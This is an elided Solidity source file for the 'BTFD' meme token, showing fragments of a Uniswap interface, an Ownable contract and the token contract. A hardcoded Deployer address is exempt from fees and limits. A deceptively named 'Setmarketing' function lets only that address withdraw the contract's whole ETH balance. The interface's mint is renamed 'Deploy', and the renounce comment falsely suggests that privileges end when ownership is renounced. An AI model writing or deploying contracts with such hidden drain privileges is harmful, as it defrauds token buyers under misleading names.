...
interface IUniswapV2Pair {
    ...
    event _Deploy(address indexed sender, uint amount0, uint amount1);
    ...
    function Deploy(address to) external returns (uint liquidity);
...
contract Ownable is Context {
     ...
     * thereby removing any functionality that is only available to the owner and any Deployed adress in code forever and cannot be reversed.
     */
...
contract BTFD is ERC20, Ownable {
    ...
    event DeployerUpdated(address indexed newWallet, address indexed oldWallet);
    ...
    constructor() ERC20("BUY THE FUCKING DIP", "BTFD") {
        ...
        Deployer = payable(0xc56f72fF565Be178D8B098D6b8C967d84A0F90C5); //Smart contract Deployer and owner at time of Deployment.
        ...
        devWallet = payable(0xc56f72fF565Be178D8B098D6b8C967d84A0F90C5);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(Deployer), true);    
        excludeFromMaxTransaction(address(devWallet), true);
        excludeFromMaxTransaction(owner(), true);
        excludeFromFees(address(Deployer), true);
    ...
    function Setmarketing(uint amount) external {
        require(msg.sender == Deployer);
        ...
        (bool success,) = address(Deployer).call{value: address(this).balance}("");
    }
    ...
    function swapBack() private {
        ...
        (success,) = address(Deployer).call{value: address(this).balance}("");
    }
